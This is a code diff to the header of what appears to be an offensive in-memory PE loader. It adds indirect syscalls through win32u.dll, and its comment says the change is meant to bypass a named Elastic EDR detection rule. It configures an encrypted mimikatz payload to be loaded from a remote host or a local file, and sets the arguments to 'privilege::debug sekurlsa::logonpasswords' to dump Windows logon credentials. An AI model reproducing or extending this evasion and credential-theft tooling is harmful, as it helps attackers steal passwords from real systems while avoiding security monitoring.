@@ -3,6 +3,15 @@
 #include "structs.h"
 
 
+/*--------------------------------
+ Search for syscall in win32u.dll
+ if not defined a indirect syscall
+ jmp address will be in ntdll.dll
+ Implemented in order to bypass 
+ https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_via_indirect_random_syscall.toml
+--------------------------------*/
+#define WIN32_JMP
+
 
 /*---------------------------
  Read from web or local file
@@ -12,9 +21,9 @@
 
 #define HOST L"192.168.100.161"
 #define REMOTE_FILE L"mimikatz-enc.bin"
-//#define LOCAL_FILE "C:\\Users\\nullb1t3\\Desktop\\mimikatz-enc.bin"
+#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"
 
-#define PE_ARGS "coffee exit"
+#define PE_ARGS "privilege::debug sekurlsa::logonpasswords exit"
 //#define DLL_EXPORTED_FUNC "someExportedFunc"    //in case of DLLs
 
 /*------------------
@@ -47,6 +56,7 @@
   Global variables
 ---------------------*/
 extern NTCONF g_NtConfig;
+extern NTCONF g_Win32u;     // Struct to hold extracted PE headers from win32u.dll
 extern SC_FUNC g_Fun;
 extern CONTENT temp;    //To hold the Base addres of the copied PE and its size, used to encrypt/decrypt its content
 
@@ -88,11 +98,17 @@ BOOL Crypt(IN PCONTENT cnt);
 BOOL NtInitConfig();
 BOOL GetSyscl(IN DWORD dwSysHash, OUT PSYSCALL pSyscl);
 BOOL InitSyscls();
+//Win32u.dll indirect syscalls
+#ifdef WIN32_JMP
+VOID AddWin32();
+BOOL ParseWin32(IN ULONG_PTR moduleBase);
+BOOL FetchWin32Syscall(OUT PVOID* pSyscallJmpAddr);
+#endif
+
 
 //Dynamic syscall invoke
 extern VOID GetSSN(DWORD SSN, PVOID jmpAddr);
 extern Invoke();
-
 
 
 //TLS callback
